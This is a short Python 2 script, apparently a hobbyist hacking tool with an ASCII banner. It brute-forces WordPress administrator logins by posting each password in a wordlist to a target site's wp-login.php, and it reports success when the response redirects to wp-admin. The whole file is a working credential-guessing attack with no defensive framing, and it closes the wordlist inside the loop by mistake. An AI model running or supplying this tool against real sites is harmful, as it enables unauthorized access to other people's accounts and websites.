#!/usr/bin/python
# coding=utf-8
import argparse
import urllib
import time
import urllib2
import os
# detecting os 'nt' means its windows
if os.name == 'nt':
	os.system('cls')
else:	
	os.system('clear')
banner = """
 ██░ ██ ▓█████  ███▄ ▄███▓ ▄▄▄      
▓██░ ██▒▓█   ▀ ▓██▒▀█▀ ██▒▒████▄    
▒██▀▀██░▒███   ▓██    ▓██░▒██  ▀█▄  
░▓█ ░██ ▒▓█  ▄ ▒██    ▒██ ░██▄▄▄▄██ 
░▓█▒░██▓░▒████▒▒██▒   ░██▒ ▓█   ▓██▒
 ▒ ░░▒░▒░░ ▒░ ░░ ▒░   ░  ░ ▒▒   ▓▒█░
 ▒ ░▒░ ░ ░ ░  ░░  ░      ░  ▒   ▒▒ ░
 ░  ░░ ░   ░   ░      ░     ░   ▒   
 ░  ░  ░   ░  ░       ░         ░  ░

"""
print'\033[92m' + banner
# making arguments
parser = argparse.ArgumentParser()
parser.add_argument('-u','--user',help='username or admin')
parser.add_argument('-w','--wordlist',help='specify the wordlist')
parser.add_argument('-s','--server',help='server ip ex. 192.168.1.100 or www.example.com')
args = parser.parse_args()
# specifing targets
url = 'http://' + args.server + '/wp-login.php' #(1)
user_login = args.user #(2)
wordlist = open(args.wordlist, 'r')	# opening a wordlist
passwords = wordlist.readlines()	# read lines
for password in passwords:		# making a loop
	password = password.strip()	# reading lines one by one 
	values = { 'log': user_login, 'pwd': password }	# use inspect element in your browser if u have no idea
	data = urllib.urlencode(values)
	request = urllib2.Request(url, data)
	response = urllib2.urlopen(request)
	try:
		idx = response.geturl().index('wp-admin') # when u sccessfully logged in the url will be http:/server/wp-admin
	except:
		idx = 0
	if idx > 0: #(6)
		print "\033[94mpassword found: " + "\033[92m[" + password + "]"
		break
	else:
		print "\033[31mfailed: " + "\033[93m[" + password + "]"

	wordlist.close()
